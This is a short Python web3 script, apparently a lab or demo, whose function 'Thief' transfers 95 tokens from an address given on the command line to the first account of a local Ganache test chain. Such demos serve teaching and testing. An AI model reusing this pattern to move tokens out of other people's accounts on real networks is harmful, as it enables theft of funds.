import os
import sys
import json
from web3 import Web3, HTTPProvider

import contractData

def Thief():
    try:
        addr=Web3.toChecksumAddress(sys.argv[1])
        # Setup web3 infrastructure and contract access
        w3 = Web3(HTTPProvider(contractData.GANACHE_IP))
        abi = json.load(open(contractData.ABI_PATH))['abi']
        contract = w3.eth.contract(address=contractData.CONTRACT_ADDR,
                                   abi=abi)
        tx_hash = contract.functions.transfer(w3.eth.accounts[0], 95).transact({'from': addr})
        tx_receipt = w3.eth.waitForTransactionReceipt(tx_hash)
    except ValueError as e:
        return e

Thief()
